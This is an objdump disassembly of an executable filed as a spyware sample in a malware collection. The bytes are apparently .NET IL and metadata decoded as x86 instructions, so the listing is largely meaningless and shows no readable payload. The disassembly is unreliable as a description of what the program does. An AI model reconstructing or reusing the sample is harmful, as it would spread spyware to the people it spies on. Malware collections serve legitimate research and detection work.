
malware_samples/spyware/1b904ced16d1c60d7169b06e1b1a1bf1b794c47b3650654d89ad21b643c9ccea.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	d6                   	salc
  402001:	39 00                	cmp    %eax,(%eax)
  402003:	00 00                	add    %al,(%eax)
  402005:	00 00                	add    %al,(%eax)
  402007:	00 48 00             	add    %cl,0x0(%eax)
  40200a:	00 00                	add    %al,(%eax)
  40200c:	02 00                	add    (%eax),%al
  40200e:	05 00 7c 24 00       	add    $0x247c00,%eax
  402013:	00 5c 14 00          	add    %bl,0x0(%esp,%edx,1)
  402017:	00 01                	add    %al,(%ecx)
  402019:	00 00                	add    %al,(%eax)
  40201b:	00 04 00             	add    %al,(%eax,%eax,1)
  40201e:	00 06                	add    %al,(%esi)
	...
  402050:	1a 7e 01             	sbb    0x1(%esi),%bh
  402053:	00 00                	add    %al,(%eax)
  402055:	04 2a                	add    $0x2a,%al
  402057:	1e                   	push   %ds
  402058:	02 80 01 00 00 04    	add    0x4000001(%eax),%al
  40205e:	2a 00                	sub    (%eax),%al
  402060:	1b 30                	sbb    (%eax),%esi
  402062:	04 00                	add    $0x0,%al
  402064:	69 01 00 00 01 00    	imul   $0x10000,(%ecx),%eax
  40206a:	00 11                	add    %dl,(%ecx)
  40206c:	00 1f                	add    %bl,(%edi)
  40206e:	28 28                	sub    %ch,(%eax)
  402070:	11 00                	adc    %eax,(%eax)
  402072:	00 0a                	add    %cl,(%edx)
  402074:	72 01                	jb     0x402077
  402076:	00 00                	add    %al,(%eax)
  402078:	70 02                	jo     0x40207c
  40207a:	72 15                	jb     0x402091
  40207c:	00 00                	add    %al,(%eax)
  40207e:	70 28                	jo     0x4020a8
  402080:	12 00                	adc    (%eax),%al
  402082:	00 0a                	add    %cl,(%edx)
  402084:	73 13                	jae    0x402099
  402086:	00 00                	add    %al,(%eax)
  402088:	0a 0a                	or     (%edx),%cl
  40208a:	73 14                	jae    0x4020a0
  40208c:	00 00                	add    %al,(%eax)
  40208e:	0a 0b                	or     (%ebx),%cl
  402090:	00 00                	add    %al,(%eax)
  402092:	06                   	push   %es
  402093:	03 2d 07 72 43 00    	add    0x437207,%ebp
  402099:	00 70 2b             	add    %dh,0x2b(%eax)
  40209c:	05 72 4f 00 00       	add    $0x4f72,%eax
  4020a1:	70 6f                	jo     0x402112
  4020a3:	15 00 00 0a 0c       	adc    $0xc0a0000,%eax
  4020a8:	16                   	push   %ss
  4020a9:	0d 38 bf 00 00       	or     $0xbf38,%eax
  4020ae:	00 08                	add    %cl,(%eax)
  4020b0:	09 9a 13 04 00 11    	or     %ebx,0x11000413(%edx)
  4020b6:	04 6f                	add    $0x6f,%al
  4020b8:	16                   	push   %ss
  4020b9:	00 00                	add    %al,(%eax)
  4020bb:	0a 6f 17             	or     0x17(%edi),%ch
  4020be:	00 00                	add    %al,(%eax)
  4020c0:	0a 13                	or     (%ebx),%dl
  4020c2:	05 00 11 05 72       	add    $0x72051100,%eax
  4020c7:	5b                   	pop    %ebx
  4020c8:	00 00                	add    %al,(%eax)
  4020ca:	70 28                	jo     0x4020f4
  4020cc:	18 00                	sbb    %al,(%eax)
  4020ce:	00 0a                	add    %cl,(%edx)
  4020d0:	6f                   	outsl  %ds:(%esi),(%dx)
  4020d1:	19 00                	sbb    %eax,(%eax)
  4020d3:	00 0a                	add    %cl,(%edx)
  4020d5:	13 06                	adc    (%esi),%eax
  4020d7:	2b 1c 11             	sub    (%ecx,%edx,1),%ebx
  4020da:	06                   	push   %es
  4020db:	6f                   	outsl  %ds:(%esi),(%dx)
  4020dc:	1a 00                	sbb    (%eax),%al
  4020de:	00 0a                	add    %cl,(%edx)
  4020e0:	74 18                	je     0x4020fa
  4020e2:	00 00                	add    %al,(%eax)
  4020e4:	01 13                	add    %edx,(%ebx)
  4020e6:	07                   	pop    %es
  4020e7:	07                   	pop    %es
  4020e8:	11 07                	adc    %eax,(%edi)
  4020ea:	6f                   	outsl  %ds:(%esi),(%dx)
  4020eb:	1b 00                	sbb    (%eax),%eax
  4020ed:	00 0a                	add    %cl,(%edx)
  4020ef:	6f                   	outsl  %ds:(%esi),(%dx)
  4020f0:	1c 00                	sbb    $0x0,%al
  4020f2:	00 0a                	add    %cl,(%edx)
  4020f4:	00 11                	add    %dl,(%ecx)
  4020f6:	06                   	push   %es
  4020f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4020f8:	1d 00 00 0a 2d       	sbb    $0x2d0a0000,%eax
  4020fd:	db de                	fcmovnu %st(6),%st
  4020ff:	16                   	push   %ss
  402100:	11 06                	adc    %eax,(%esi)
  402102:	75 19                	jne    0x40211d
  402104:	00 00                	add    %al,(%eax)
  402106:	01 13                	add    %edx,(%ebx)
  402108:	08 11                	or     %dl,(%ecx)
  40210a:	08 2c 08             	or     %ch,(%eax,%ecx,1)
  40210d:	11 08                	adc    %ecx,(%eax)
  40210f:	6f                   	outsl  %ds:(%esi),(%dx)
  402110:	1e                   	push   %ds
  402111:	00 00                	add    %al,(%eax)
  402113:	0a 00                	or     (%eax),%al
  402115:	dc 00                	faddl  (%eax)
  402117:	11 05 72 99 00 00    	adc    %eax,0x9972
  40211d:	70 28                	jo     0x402147
  40211f:	18 00                	sbb    %al,(%eax)
  402121:	00 0a                	add    %cl,(%edx)
  402123:	6f                   	outsl  %ds:(%esi),(%dx)
  402124:	19 00                	sbb    %eax,(%eax)
  402126:	00 0a                	add    %cl,(%edx)
  402128:	13 09                	adc    (%ecx),%ecx
  40212a:	2b 1c 11             	sub    (%ecx,%edx,1),%ebx
  40212d:	09 6f 1a             	or     %ebp,0x1a(%edi)
  402130:	00 00                	add    %al,(%eax)
  402132:	0a 74 18 00          	or     0x0(%eax,%ebx,1),%dh
  402136:	00 01                	add    %al,(%ecx)
  402138:	13 0a                	adc    (%edx),%ecx
  40213a:	07                   	pop    %es
  40213b:	11 0a                	adc    %ecx,(%edx)
  40213d:	6f                   	outsl  %ds:(%esi),(%dx)
  40213e:	1b 00                	sbb    (%eax),%eax
  402140:	00 0a                	add    %cl,(%edx)
  402142:	6f                   	outsl  %ds:(%esi),(%dx)
  402143:	1c 00                	sbb    $0x0,%al
  402145:	00 0a                	add    %cl,(%edx)
  402147:	00 11                	add    %dl,(%ecx)
  402149:	09 6f 1d             	or     %ebp,0x1d(%edi)
  40214c:	00 00                	add    %al,(%eax)
  40214e:	0a 2d db de 16 11    	or     0x1116dedb,%ch
  402154:	09 75 19             	or     %esi,0x19(%ebp)
  402157:	00 00                	add    %al,(%eax)
  402159:	01 13                	add    %edx,(%ebx)
  40215b:	08 11                	or     %dl,(%ecx)
  40215d:	08 2c 08             	or     %ch,(%eax,%ecx,1)
  402160:	11 08                	adc    %ecx,(%eax)
  402162:	6f                   	outsl  %ds:(%esi),(%dx)
  402163:	1e                   	push   %ds
  402164:	00 00                	add    %al,(%eax)
  402166:	0a 00                	or     (%eax),%al
  402168:	dc 00                	faddl  (%eax)
  40216a:	09 17                	or     %edx,(%edi)
  40216c:	58                   	pop    %eax
  40216d:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  402172:	3f                   	aas
  402173:	38 ff                	cmp    %bh,%bh
  402175:	ff                   	(bad)
  402176:	ff 00                	incl   (%eax)
  402178:	de 05 26 00 00 de    	fiadds 0xde000026
  40217e:	00 07                	add    %al,(%edi)
  402180:	28 01                	sub    %al,(%ecx)
  402182:	00 00                	add    %al,(%eax)
  402184:	2b 28                	sub    (%eax),%ebp
  402186:	02 00                	add    (%eax),%al
  402188:	00 2b                	add    %ch,(%ebx)
  40218a:	0b 07                	or     (%edi),%eax
  40218c:	6f                   	outsl  %ds:(%esi),(%dx)
  40218d:	21 00                	and    %eax,(%eax)
  40218f:	00 0a                	add    %cl,(%edx)
  402191:	16                   	push   %ss
  402192:	fe 02                	incb   (%edx)
  402194:	13 0b                	adc    (%ebx),%ecx
  402196:	11 0b                	adc    %ecx,(%ebx)
  402198:	2c 33                	sub    $0x33,%al
  40219a:	00 17                	add    %dl,(%edi)
  40219c:	28 02                	sub    %al,(%edx)
  40219e:	00 00                	add    %al,(%eax)
  4021a0:	06                   	push   %es
  4021a1:	00 07                	add    %al,(%edi)
  4021a3:	13 0c 07             	adc    (%edi,%eax,1),%ecx
  4021a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4021a7:	21 00                	and    %eax,(%eax)
  4021a9:	00 0a                	add    %cl,(%edx)
  4021ab:	17                   	pop    %ss
  4021ac:	59                   	pop    %ecx
  4021ad:	13 0d 11 0c 11 0d    	adc    0xd110c11,%ecx
  4021b3:	11 0c 11             	adc    %ecx,(%ecx,%edx,1)
  4021b6:	0d 6f 22 00 00       	or     $0x226f,%eax
  4021bb:	0a 72 b7             	or     -0x49(%edx),%dh
  4021be:	00 00                	add    %al,(%eax)
  4021c0:	70 28                	jo     0x4021ea
  4021c2:	23 00                	and    (%eax),%eax
  4021c4:	00 0a                	add    %cl,(%edx)
  4021c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4021c7:	24 00                	and    $0x0,%al
  4021c9:	00 0a                	add    %cl,(%edx)
  4021cb:	00 00                	add    %al,(%eax)
  4021cd:	07                   	pop    %es
  4021ce:	13 0e                	adc    (%esi),%ecx
  4021d0:	2b 00                	sub    (%eax),%eax
  4021d2:	11 0e                	adc    %ecx,(%esi)
  4021d4:	2a 00                	sub    (%eax),%al
  4021d6:	00 00                	add    %al,(%eax)
  4021d8:	01 28                	add    %ebp,(%eax)
  4021da:	00 00                	add    %al,(%eax)
  4021dc:	02 00                	add    (%eax),%al
  4021de:	6b 00 29             	imul   $0x29,(%eax),%eax
  4021e1:	94                   	xchg   %eax,%esp
  4021e2:	00 16                	add    %dl,(%esi)
  4021e4:	00 00                	add    %al,(%eax)
  4021e6:	00 00                	add    %al,(%eax)
  4021e8:	02 00                	add    (%eax),%al
  4021ea:	be 00 29 e7 00       	mov    $0xe72900,%esi
  4021ef:	16                   	push   %ss
  4021f0:	00 00                	add    %al,(%eax)
  4021f2:	00 00                	add    %al,(%eax)
  4021f4:	00 00                	add    %al,(%eax)
  4021f6:	24 00                	and    $0x0,%al
  4021f8:	ea 0e 01 05 10 00 00 	ljmp   $0x0,$0x1005010e
  4021ff:	01 1b                	add    %ebx,(%ebx)
  402201:	30 01                	xor    %al,(%ecx)
  402203:	00 4d 00             	add    %cl,0x0(%ebp)
  402206:	00 00                	add    %al,(%eax)
  402208:	02 00                	add    (%eax),%al
  40220a:	00 11                	add    %dl,(%ecx)
  40220c:	00 00                	add    %al,(%eax)
  40220e:	7e 03                	jle    0x402213
  402210:	00 00                	add    %al,(%eax)
  402212:	04 6f                	add    $0x6f,%al
  402214:	25 00 00 0a 0a       	and    $0xa0a0000,%eax
  402219:	2b 0f                	sub    (%edi),%ecx
  40221b:	12 00                	adc    (%eax),%al
  40221d:	28 26                	sub    %ah,(%esi)
  40221f:	00 00                	add    %al,(%eax)
  402221:	0a 0b                	or     (%ebx),%cl
  402223:	07                   	pop    %es
  402224:	6f                   	outsl  %ds:(%esi),(%dx)
  402225:	08 00                	or     %al,(%eax)
  402227:	00 06                	add    %al,(%esi)
  402229:	00 12                	add    %dl,(%edx)
  40222b:	00 28                	add    %ch,(%eax)
  40222d:	27                   	daa
  40222e:	00 00                	add    %al,(%eax)
  402230:	0a 2d e8 de 0f 12    	or     0x120fdee8,%ch
  402236:	00 fe                	add    %bh,%dh
  402238:	16                   	push   %ss
  402239:	03 00                	add    (%eax),%eax
  40223b:	00 1b                	add    %bl,(%ebx)
  40223d:	6f                   	outsl  %ds:(%esi),(%dx)
  40223e:	1e                   	push   %ds
  40223f:	00 00                	add    %al,(%eax)
  402241:	0a 00                	or     (%eax),%al
  402243:	dc 28                	fsubrl (%eax)
  402245:	01 00                	add    %eax,(%eax)
  402247:	00 06                	add    %al,(%esi)
  402249:	0c 08                	or     $0x8,%al
  40224b:	2c 0b                	sub    $0xb,%al
  40224d:	7e 02                	jle    0x402251
  40224f:	00 00                	add    %al,(%eax)
  402251:	04 28                	add    $0x28,%al
  402253:	09 00                	or     %eax,(%eax)
  402255:	00 06                	add    %al,(%esi)
  402257:	00 2a                	add    %ch,(%edx)
  402259:	00 00                	add    %al,(%eax)
  40225b:	00 01                	add    %al,(%ecx)
  40225d:	10 00                	adc    %al,(%eax)
  40225f:	00 02                	add    %al,(%edx)
  402261:	00 0d 00 1c 29 00    	add    %cl,0x291c00
  402267:	0f 00 00             	sldt   (%eax)
  40226a:	00 00                	add    %al,(%eax)
  40226c:	22 02                	and    (%edx),%al
  40226e:	28 28                	sub    %ch,(%eax)
  402270:	00 00                	add    %al,(%eax)
  402272:	0a 00                	or     (%eax),%al
  402274:	2a 00                	sub    (%eax),%al
  402276:	00 00                	add    %al,(%eax)
  402278:	13 30                	adc    (%eax),%esi
  40227a:	05 00 b6 00 00       	add    $0xb600,%eax
  40227f:	00 00                	add    %al,(%eax)
  402281:	00 00                	add    %al,(%eax)
  402283:	00 73 14             	add    %dh,0x14(%ebx)
  402286:	00 00                	add    %al,(%eax)
  402288:	0a 80 02 00 00 04    	or     0x4000002(%eax),%al
  40228e:	73 29                	jae    0x4022b9
  402290:	00 00                	add    %al,(%eax)
  402292:	0a 25 72 cb 00 00    	or     0xcb72,%ah
  402298:	70 72                	jo     0x40230c
  40229a:	db 00                	fildl  (%eax)
  40229c:	00 70 16             	add    %dh,0x16(%eax)
  40229f:	73 07                	jae    0x4022a8
  4022a1:	00 00                	add    %al,(%eax)
  4022a3:	06                   	push   %es
  4022a4:	6f                   	outsl  %ds:(%esi),(%dx)
  4022a5:	2a 00                	sub    (%eax),%al
  4022a7:	00 0a                	add    %cl,(%edx)
  4022a9:	00 25 72 fb 00 00    	add    %ah,0xfb72
  4022af:	70 72                	jo     0x402323
  4022b1:	19 01                	sbb    %eax,(%ecx)
  4022b3:	00 70 17             	add    %dh,0x17(%eax)
  4022b6:	73 07                	jae    0x4022bf
  4022b8:	00 00                	add    %al,(%eax)
  4022ba:	06                   	push   %es
  4022bb:	6f                   	outsl  %ds:(%esi),(%dx)
  4022bc:	2a 00                	sub    (%eax),%al
  4022be:	00 0a                	add    %cl,(%edx)
  4022c0:	00 25 72 45 01 00    	add    %ah,0x14572
  4022c6:	70 72                	jo     0x40233a
  4022c8:	5d                   	pop    %ebp
  4022c9:	01 00                	add    %eax,(%eax)
  4022cb:	70 16                	jo     0x4022e3
  4022cd:	73 07                	jae    0x4022d6
  4022cf:	00 00                	add    %al,(%eax)
  4022d1:	06                   	push   %es
  4022d2:	6f                   	outsl  %ds:(%esi),(%dx)
  4022d3:	2a 00                	sub    (%eax),%al
  4022d5:	00 0a                	add    %cl,(%edx)
  4022d7:	00 25 72 83 01 00    	add    %ah,0x18372
  4022dd:	70 72                	jo     0x402351
  4022df:	9f                   	lahf
  4022e0:	01 00                	add    %eax,(%eax)
  4022e2:	70 16                	jo     0x4022fa
  4022e4:	73 07                	jae    0x4022ed
  4022e6:	00 00                	add    %al,(%eax)
  4022e8:	06                   	push   %es
  4022e9:	6f                   	outsl  %ds:(%esi),(%dx)
  4022ea:	2a 00                	sub    (%eax),%al
  4022ec:	00 0a                	add    %cl,(%edx)
  4022ee:	00 25 72 eb 01 00    	add    %ah,0x1eb72
  4022f4:	70 72                	jo     0x402368
  4022f6:	f7 01 00 70 17 73    	testl  $0x73177000,(%ecx)
  4022fc:	07                   	pop    %es
  4022fd:	00 00                	add    %al,(%eax)
  4022ff:	06                   	push   %es
  402300:	6f                   	outsl  %ds:(%esi),(%dx)
  402301:	2a 00                	sub    (%eax),%al
  402303:	00 0a                	add    %cl,(%edx)
  402305:	00 25 72 3f 02 00    	add    %ah,0x23f72
  40230b:	70 72                	jo     0x40237f
  40230d:	4b                   	dec    %ebx
  40230e:	02 00                	add    (%eax),%al
  402310:	70 17                	jo     0x402329
  402312:	73 07                	jae    0x40231b
  402314:	00 00                	add    %al,(%eax)
  402316:	06                   	push   %es
  402317:	6f                   	outsl  %ds:(%esi),(%dx)
  402318:	2a 00                	sub    (%eax),%al
  40231a:	00 0a                	add    %cl,(%edx)
  40231c:	00 25 72 b3 02 00    	add    %ah,0x2b372
  402322:	70 72                	jo     0x402396
  402324:	c1 02 00             	roll   $0x0,(%edx)
  402327:	70 17                	jo     0x402340
  402329:	73 07                	jae    0x402332
  40232b:	00 00                	add    %al,(%eax)
  40232d:	06                   	push   %es
  40232e:	6f                   	outsl  %ds:(%esi),(%dx)
  40232f:	2a 00                	sub    (%eax),%al
  402331:	00 0a                	add    %cl,(%edx)
  402333:	00 80 03 00 00 04    	add    %al,0x4000003(%eax)
  402339:	2a 7a 02             	sub    0x2(%edx),%bh
  40233c:	28 28                	sub    %ch,(%eax)
  40233e:	00 00                	add    %al,(%eax)
  402340:	0a 00                	or     (%eax),%al
  402342:	00 02                	add    %al,(%edx)
  402344:	03 7d 04             	add    0x4(%ebp),%edi
  402347:	00 00                	add    %al,(%eax)
  402349:	04 02                	add    $0x2,%al
  40234b:	04 7d                	add    $0x7d,%al
  40234d:	05 00 00 04 02       	add    $0x2040000,%eax
  402352:	05 7d 06 00 00       	add    $0x67d,%eax
  402357:	04 2a                	add    $0x2a,%al
  402359:	00 00                	add    %al,(%eax)
  40235b:	00 13                	add    %dl,(%ebx)
  40235d:	30 05 00 4c 00 00    	xor    %al,0x4c00
  402363:	00 03                	add    %al,(%ebx)
  402365:	00 00                	add    %al,(%eax)
  402367:	11 00                	adc    %eax,(%eax)
  402369:	02 7b 05             	add    0x5(%ebx),%bh
  40236c:	00 00                	add    %al,(%eax)
  40236e:	04 02                	add    $0x2,%al
  402370:	7b 06                	jnp    0x402378
  402372:	00 00                	add    %al,(%eax)
  402374:	04 28                	add    $0x28,%al
  402376:	03 00                	add    (%eax),%eax
  402378:	00 06                	add    %al,(%esi)
  40237a:	0a 06                	or     (%esi),%al
  40237c:	6f                   	outsl  %ds:(%esi),(%dx)
  40237d:	21 00                	and    %eax,(%eax)
  40237f:	00 0a                	add    %cl,(%edx)
  402381:	16                   	push   %ss
  402382:	fe 02                	incb   (%edx)
  402384:	0b 07                	or     (%edi),%eax
  402386:	2c 2b                	sub    $0x2b,%al
  402388:	00 06                	add    %al,(%esi)
  40238a:	16                   	push   %ss
  40238b:	72 1b                	jb     0x4023a8
  40238d:	03 00                	add    (%eax),%eax
  40238f:	70 02                	jo     0x402393
  402391:	7b 04                	jnp    0x402397
  402393:	00 00                	add    %al,(%eax)
  402395:	04 72                	add    $0x72,%al
  402397:	23 03                	and    (%ebx),%eax
  402399:	00 70 28             	add    %dh,0x28(%eax)
  40239c:	2b 00                	sub    (%eax),%eax
  40239e:	00 0a                	add    %cl,(%edx)
  4023a0:	6f                   	outsl  %ds:(%esi),(%dx)
  4023a1:	2c 00                	sub    $0x0,%al
  4023a3:	00 0a                	add    %cl,(%edx)
  4023a5:	00 7e 02             	add    %bh,0x2(%esi)
  4023a8:	00 00                	add    %al,(%eax)
  4023aa:	04 06                	add    $0x6,%al
  4023ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4023ad:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  4023b2:	00 2a                	add    %ch,(%edx)
  4023b4:	1b 30                	sbb    (%eax),%esi
  4023b6:	07                   	pop    %es
  4023b7:	00 9f 00 00 00 04    	add    %bl,0x4000000(%edi)
  4023bd:	00 00                	add    %al,(%eax)
  4023bf:	11 00                	adc    %eax,(%eax)
  4023c1:	00 73 2e             	add    %dh,0x2e(%ebx)
  4023c4:	00 00                	add    %al,(%eax)
  4023c6:	0a 0a                	or     (%edx),%cl
  4023c8:	73 2f                	jae    0x4023f9
  4023ca:	00 00                	add    %al,(%eax)
  4023cc:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  4023cf:	72 29                	jb     0x4023fa
  4023d1:	03 00                	add    (%eax),%eax
  4023d3:	70 1b                	jo     0x4023f0
  4023d5:	8d 21                	lea    (%ecx),%esp
  4023d7:	00 00                	add    %al,(%eax)
  4023d9:	01 25 16 72 39 03    	add    %esp,0x3397216
  4023df:	00 70 a2             	add    %dh,-0x5e(%eax)
  4023e2:	25 17 28 30 00       	and    $0x302817,%eax
  4023e7:	00 0a                	add    %cl,(%edx)
  4023e9:	a2 25 18 72 5b       	mov    %al,0x5b721825
  4023ee:	03 00                	add    (%eax),%eax
  4023f0:	70 a2                	jo     0x402394
  4023f2:	25 19 72 63 03       	and    $0x3637219,%eax
  4023f7:	00 70 02             	add    %dh,0x2(%eax)
  4023fa:	28 31                	sub    %dh,(%ecx)
  4023fc:	00 00                	add    %al,(%eax)
  4023fe:	0a a2 25 1a 72 23    	or     0x23721a25(%edx),%ah
  402404:	03 00                	add    (%eax),%eax
  402406:	70 a2                	jo     0x4023aa
  402408:	28 32                	sub    %dh,(%edx)
  40240a:	00 00                	add    %al,(%eax)
  40240c:	0a 6f 33             	or     0x33(%edi),%ch
  40240f:	00 00                	add    %al,(%eax)
  402411:	0a 00                	or     (%eax),%al
  402413:	08 72 67             	or     %dh,0x67(%edx)
  402416:	03 00                	add    (%eax),%eax
  402418:	70 72                	jo     0x40248c
  40241a:	79 03                	jns    0x40241f
  40241c:	00 70 6f             	add    %dh,0x6f(%eax)
  40241f:	33 00                	xor    (%eax),%eax
  402421:	00 0a                	add    %cl,(%edx)
  402423:	00 08                	add    %cl,(%eax)
  402425:	72 8d                	jb     0x4023b4
  402427:	03 00                	add    (%eax),%eax
  402429:	70 72                	jo     0x40249d
  40242b:	a3 03 00 70 6f       	mov    %eax,0x6f700003
  402430:	33 00                	xor    (%eax),%eax
  402432:	00 0a                	add    %cl,(%edx)
  402434:	00 08                	add    %cl,(%eax)
  402436:	0b 06                	or     (%esi),%eax
  402438:	7e 07                	jle    0x402441
  40243a:	00 00                	add    %al,(%eax)
  40243c:	04 07                	add    $0x7,%al
  40243e:	73 34                	jae    0x402474
  402440:	00 00                	add    %al,(%eax)
  402442:	0a 6f 35             	or     0x35(%edi),%ch
  402445:	00 00                	add    %al,(%eax)
  402447:	0a 6f 36             	or     0x36(%edi),%ch
  40244a:	00 00                	add    %al,(%eax)
  40244c:	0a 0d 12 03 28 37    	or     0x37280312,%cl
  402452:	00 00                	add    %al,(%eax)
  402454:	0a 26                	or     (%esi),%ah
  402456:	00 de                	add    %bl,%dh
  402458:	05 26 00 00 de       	add    $0xde000026,%eax
  40245d:	00 2a                	add    %ch,(%edx)
  40245f:	00 01                	add    %al,(%ecx)
  402461:	10 00                	adc    %al,(%eax)
  402463:	00 00                	add    %al,(%eax)
  402465:	00 01                	add    %al,(%ecx)
  402467:	00 98 99 00 05 10    	add    %bl,0x10050099(%eax)
  40246d:	00 00                	add    %al,(%eax)
  40246f:	01 2e                	add    %ebp,(%esi)
  402471:	72 64                	jb     0x4024d7
  402473:	04 00                	add    $0x0,%al
  402475:	70 80                	jo     0x4023f7
  402477:	07                   	pop    %es
  402478:	00 00                	add    %al,(%eax)
  40247a:	04 2a                	add    $0x2a,%al
  40247c:	42                   	inc    %edx
  40247d:	53                   	push   %ebx
  40247e:	4a                   	dec    %edx
  40247f:	42                   	inc    %edx
  402480:	01 00                	add    %eax,(%eax)
  402482:	01 00                	add    %eax,(%eax)
  402484:	00 00                	add    %al,(%eax)
  402486:	00 00                	add    %al,(%eax)
  402488:	0c 00                	or     $0x0,%al
  40248a:	00 00                	add    %al,(%eax)
  40248c:	76 34                	jbe    0x4024c2
  40248e:	2e 30 2e             	xor    %ch,%cs:(%esi)
  402491:	33 30                	xor    (%eax),%esi
  402493:	33 31                	xor    (%ecx),%esi
  402495:	39 00                	cmp    %eax,(%eax)
  402497:	00 00                	add    %al,(%eax)
  402499:	00 05 00 6c 00 00    	add    %al,0x6c00
  40249f:	00 f8                	add    %bh,%al
  4024a1:	04 00                	add    $0x0,%al
  4024a3:	00 23                	add    %ah,(%ebx)
  4024a5:	7e 00                	jle    0x4024a7
  4024a7:	00 64 05 00          	add    %ah,0x0(%ebp,%eax,1)
  4024ab:	00 30                	add    %dh,(%eax)
  4024ad:	06                   	push   %es
  4024ae:	00 00                	add    %al,(%eax)
  4024b0:	23 53 74             	and    0x74(%ebx),%edx
  4024b3:	72 69                	jb     0x40251e
  4024b5:	6e                   	outsb  %ds:(%esi),(%dx)
  4024b6:	67 73 00             	addr16 jae 0x4024b9
  4024b9:	00 00                	add    %al,(%eax)
  4024bb:	00 94 0b 00 00 60 05 	add    %dl,0x5600000(%ebx,%ecx,1)
  4024c2:	00 00                	add    %al,(%eax)
  4024c4:	23 55 53             	and    0x53(%ebp),%edx
  4024c7:	00 f4                	add    %dh,%ah
  4024c9:	10 00                	adc    %al,(%eax)
  4024cb:	00 10                	add    %dl,(%eax)
  4024cd:	00 00                	add    %al,(%eax)
  4024cf:	00 23                	add    %ah,(%ebx)
  4024d1:	47                   	inc    %edi
  4024d2:	55                   	push   %ebp
  4024d3:	49                   	dec    %ecx
  4024d4:	44                   	inc    %esp
  4024d5:	00 00                	add    %al,(%eax)
  4024d7:	00 04 11             	add    %al,(%ecx,%edx,1)
  4024da:	00 00                	add    %al,(%eax)
  4024dc:	58                   	pop    %eax
  4024dd:	03 00                	add    (%eax),%eax
  4024df:	00 23                	add    %ah,(%ebx)
  4024e1:	42                   	inc    %edx
  4024e2:	6c                   	insb   (%dx),%es:(%edi)
  4024e3:	6f                   	outsl  %ds:(%esi),(%dx)
  4024e4:	62 00                	bound  %eax,(%eax)
  4024e6:	00 00                	add    %al,(%eax)
  4024e8:	00 00                	add    %al,(%eax)
  4024ea:	00 00                	add    %al,(%eax)
  4024ec:	02 00                	add    (%eax),%al
  4024ee:	00 01                	add    %al,(%ecx)
  4024f0:	57                   	push   %edi
  4024f1:	1d a2 09 09 08       	sbb    $0x80909a2,%eax
  4024f6:	00 00                	add    %al,(%eax)
  4024f8:	00 fa                	add    %bh,%dl
  4024fa:	01 33                	add    %esi,(%ebx)
  4024fc:	00 16                	add    %dl,(%esi)
  4024fe:	00 00                	add    %al,(%eax)
  402500:	01 00                	add    %eax,(%eax)
  402502:	00 00                	add    %al,(%eax)
  402504:	2c 00                	sub    $0x0,%al
  402506:	00 00                	add    %al,(%eax)
  402508:	05 00 00 00 07       	add    $0x7000000,%eax
  40250d:	00 00                	add    %al,(%eax)
  40250f:	00 0a                	add    %cl,(%edx)
  402511:	00 00                	add    %al,(%eax)
  402513:	00 08                	add    %cl,(%eax)
  402515:	00 00                	add    %al,(%eax)
  402517:	00 37                	add    %dh,(%edi)
  402519:	00 00                	add    %al,(%eax)
  40251b:	00 02                	add    %al,(%edx)
  40251d:	00 00                	add    %al,(%eax)
  40251f:	00 12                	add    %dl,(%edx)
  402521:	00 00                	add    %al,(%eax)
  402523:	00 04 00             	add    %al,(%eax,%eax,1)
  402526:	00 00                	add    %al,(%eax)
  402528:	01 00                	add    %eax,(%eax)
  40252a:	00 00                	add    %al,(%eax)
  40252c:	01 00                	add    %eax,(%eax)
  40252e:	00 00                	add    %al,(%eax)
  402530:	02 00                	add    (%eax),%al
  402532:	00 00                	add    %al,(%eax)
  402534:	06                   	push   %es
  402535:	00 00                	add    %al,(%eax)
  402537:	00 01                	add    %al,(%ecx)
  402539:	00 00                	add    %al,(%eax)
  40253b:	00 04 00             	add    %al,(%eax,%eax,1)
  40253e:	00 00                	add    %al,(%eax)
  402540:	02 00                	add    (%eax),%al
  402542:	00 00                	add    %al,(%eax)
  402544:	00 00                	add    %al,(%eax)
  402546:	0c 03                	or     $0x3,%al
  402548:	01 00                	add    %eax,(%eax)
  40254a:	00 00                	add    %al,(%eax)
  40254c:	00 00                	add    %al,(%eax)
  40254e:	06                   	push   %es
  40254f:	00 71 02             	add    %dh,0x2(%ecx)
  402552:	b5 04                	mov    $0x4,%ch
  402554:	06                   	push   %es
  402555:	00 de                	add    %bl,%dh
  402557:	02 b5 04 06 00 8a    	add    -0x75fff9fc(%ebp),%dh
  40255d:	01 83 04 0f 00 df    	add    %eax,-0x20fff0fc(%ebx)
  402563:	04 00                	add    $0x0,%al
  402565:	00 06                	add    %al,(%esi)
  402567:	00 cd                	add    %cl,%ch
  402569:	01 ab 03 06 00 54    	add    %ebp,0x54000603(%ebx)
  40256f:	02 ab 03 06 00 35    	add    0x35000603(%ebx),%ch
  402575:	02 ab 03 06 00 c5    	add    -0x3afff9fd(%ebx),%ch
  40257b:	02 ab 03 06 00 91    	add    -0x6efff9fd(%ebx),%ch
  402581:	02 ab 03 06 00 aa    	add    -0x55fff9fd(%ebx),%ch
  402587:	02 ab 03 06 00 e4    	add    -0x1bfff9fd(%ebx),%ch
  40258d:	01 ab 03 06 00 b9    	add    %ebp,-0x46fff9fd(%ebx)
  402593:	01 96 04 06 00 7c    	add    %edx,0x7c000604(%esi)
  402599:	01 96 04 06 00 18    	add    %edx,0x18000604(%esi)
  40259f:	02 ab 03 06 00 ff    	add    -0xfff9fd(%ebx),%ch
  4025a5:	01 28                	add    %ebp,(%eax)
  4025a7:	03 06                	add    (%esi),%eax
  4025a9:	00 86 05 9a 03 06    	add    %al,0x6039a05(%esi)
  4025af:	00 61 01             	add    %ah,0x1(%ecx)
  4025b2:	b5 04                	mov    $0x4,%ch
  4025b4:	06                   	push   %es
  4025b5:	00 4a 01             	add    %cl,0x1(%edx)
  4025b8:	83 04 06 00          	addl   $0x0,(%esi,%eax,1)
  4025bc:	9e                   	sahf
  4025bd:	01 83 04 06 00 24    	add    %eax,0x24000604(%ebx)
  4025c3:	00 63 00             	add    %ah,0x0(%ebx)
  4025c6:	06                   	push   %es
  4025c7:	00 d6                	add    %dl,%dh
  4025c9:	03 50 00             	add    0x0(%eax),%edx
  4025cc:	06                   	push   %es
  4025cd:	00 cd                	add    %cl,%ch
